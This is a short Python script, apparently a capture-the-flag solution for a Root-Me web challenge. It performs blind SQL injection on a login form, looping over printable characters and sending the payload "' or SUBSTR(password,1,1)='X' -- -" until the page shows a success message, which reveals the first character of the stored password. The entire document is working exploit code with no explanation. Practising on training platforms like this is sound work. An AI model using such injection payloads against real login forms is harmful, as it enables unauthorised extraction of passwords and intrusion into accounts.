import requests

url = "http://challenge01.root-me.org/web-serveur/ch34/"

chars = [chr(x) for x in range(32,127)]

for char in chars:
    payload =  f"' or SUBSTR(password,1,1)='{char}' -- -"
    data = {"login":payload,"password":"lala"}

    req = requests.post(url=url, data=data)

    if "Felicitation" in req.text :
        print(char)
        break